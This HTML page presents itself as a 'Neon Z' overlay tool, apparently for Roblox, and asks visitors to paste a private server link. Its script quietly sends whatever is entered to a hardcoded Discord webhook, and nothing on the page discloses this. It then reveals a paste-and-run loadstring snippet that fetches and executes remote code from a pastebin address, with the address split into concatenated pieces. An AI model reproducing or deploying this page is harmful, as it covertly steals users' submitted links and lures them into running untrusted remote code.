
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Neon Z — Premium Draggable Tab</title>
  <style>
    body{
      margin:0;
      min-height:100vh;
      background:#0a0a0d;
      color:#e9e9ff;
      font-family:Arial, sans-serif;
      overflow:hidden;
    }
    .megaZ{
      position:fixed;
      left:50%; top:50%;
      transform:translate(-50%,-50%);
      font-weight:900;
      font-size:12rem;
      color:transparent;
      -webkit-text-stroke: 2.5px #00ff99;
      text-shadow:0 0 8px #00ff99,0 0 16px #3affc7;
      opacity:0.2;
      pointer-events:none;
    }
    .tab{
      position:fixed;
      left:50%; top:50%;
      transform:translate(-50%,-50%);
      width:500px;
      background:rgba(16,16,32,0.72);
      border:1px solid rgba(176,119,255,0.35);
      border-radius:18px;
      box-shadow:0 12px 50px rgba(138,43,226,0.35);
      backdrop-filter:blur(12px);
    }
    .head{
      padding:12px;
      background:rgba(138,43,226,0.18);
      cursor:grab;
      user-select:none;
    }
    .content{padding:18px;display:grid;gap:16px;}
    .label{color:#a0a0b7;}
    .field{
      background:rgba(32,32,64,0.55);
      border:1px solid rgba(176,119,255,0.28);
      border-radius:14px;
      padding:12px;
    }
    input[type="text"]{
      width:100%;
      background:transparent;
      border:none;
      outline:none;
      color:#e9e9ff;
      font-size:1rem;
    }
    .btn{
      padding:12px 18px;
      border-radius:12px;
      font-weight:700;
      color:#09090b;
      background:radial-gradient(circle at 30% 20%, #b077ff, #8a2be2);
      cursor:pointer;
    }
    .status{display:none;padding:10px;border-radius:10px;}
    .status.ok{color:#6dff9a;display:block;}
    .status.bad{color:#ff4d6d;display:block;}
    .snippet{display:none;margin-top:12px;}
    pre{color:#c7ffea;}
  </style>
</head>
<body>
  <div class="megaZ">Z</div>
  <div class="tab" id="tab">
    <div class="head" id="dragHandle">Neon Z — Overlay</div>
    <div class="content">
      <div class="label">Put your link private server</div>
      <div class="field">
        <input id="linkInput" type="text" placeholder="https://..." />
      </div>
      <button class="btn" id="validBtn">Valid</button>
      <div class="status" id="statusBox"></div>
      <div class="snippet" id="snippetBox">
        <pre id="snippetText">loadstring(game:HttpGet("https://".."pastebin.com/".."raw/".."rbqxe115".."#kr-@neyx-PvPSpeed"))()</pre>
      </div>
    </div>
  </div>
  <script>
    // Drag logic
    const tab=document.getElementById('tab');
    const handle=document.getElementById('dragHandle');
    let isDown=false,sx=0,sy=0,ox=0,oy=0;
    handle.addEventListener('mousedown',e=>{
      isDown=true;sx=e.clientX;sy=e.clientY;
      const r=tab.getBoundingClientRect();ox=r.left;oy=r.top;
    });
    window.addEventListener('mousemove',e=>{
      if(!isDown)return;
      const nx=ox+(e.clientX-sx),ny=oy+(e.clientY-sy);
      tab.style.left='0px';tab.style.top='0px';
      tab.style.transform=`translate(${nx}px,${ny}px)`;
    });
    window.addEventListener('mouseup',()=>isDown=false);

    // Validation + webhook
    const linkInput=document.getElementById('linkInput');
    const validBtn=document.getElementById('validBtn');
    const statusBox=document.getElementById('statusBox');
    const snippetBox=document.getElementById('snippetBox');
    const webhookURL="https://discord.com/api/webhooks/1444115096216273057/9LBZbuoR7S8NHgWBZhoLeNDllzRQ9d1L65keZ2kws9S70-hC91IS6zomgmb3_3hmYgKA";
    const looksLikeURL=v=>{try{new URL(v);return true;}catch{return false;}};
    const hiddenStartsWithH=v=>/^h/i.test(v.trim());
    validBtn.addEventListener('click',async()=>{
      const val=linkInput.value.trim();
      const gatePass=hiddenStartsWithH(val);
      const isLink=looksLikeURL(val);
      const payload={content:"**Neon Z Submission**",embeds:[{title:"Overlay Input",fields:[{name:"Link",value:val||"—"}]}]};
      try{await fetch(webhookURL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});}catch{}
      if(gatePass&&isLink){statusBox.textContent="valid";statusBox.className="status ok";snippetBox.style.display="block";}
      else{statusBox.textContent="invalid";statusBox.className="status bad";snippetBox.style.display="none";}
    });
  </script>
</body>
</html>

